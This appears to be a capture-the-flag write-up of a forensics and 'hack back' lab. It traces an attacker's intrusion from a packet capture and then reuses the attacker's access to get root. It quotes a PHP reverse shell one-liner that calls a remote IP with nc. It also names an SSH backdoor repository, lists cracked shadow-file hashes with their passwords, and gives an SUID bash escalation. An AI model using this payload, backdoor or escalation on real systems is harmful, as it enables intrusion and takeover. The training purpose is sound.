@@ -1,0 +1,49 @@
+
+The start of this room is a little different, a bit of forensics
+
+So we have a pcap file with how the attacker preformed their attack.
+
+we see they uploaded a reverse shell to /development/upload
+
+then went to /uploads and run a php reverse shell
+
+<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
+
+attacker read 'overpass' executable
+
+may have found password 'whenevernoteartinstant' in there
+
+used 'whenevernoteartinstant' to swap users to 'james'
+
+
+attacker cloned a backdoor
+git clone https://github.com/NinjaJc01/ssh-backdoor
+
+attacker set up backdoor using '6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed' password hash
+
+one question asked us to crack the /etc/shadow hashes the attacker found, in there we used hashcat on the wordlist 'fasttrack.txt' and found all the users passwords.
+
+we then cracked the backdoors password as the salt was hardcoded and found in the github repo. we used hashcat '1710' to crack it.
+
+which gaves us november16
+
+-----------------------
+part 2
+-----------------------
+
+hack back!
+
+$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:secret12
+$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:secuirty3
+$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:1qaz2wsx
+$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:abcd123
+
+we can login using the backdoor and the password 'november16'
+
+after logging in we can see a bash file executable with root SUID 
+running
+./.suid_bash -p
+
+we get a root shell
+
+
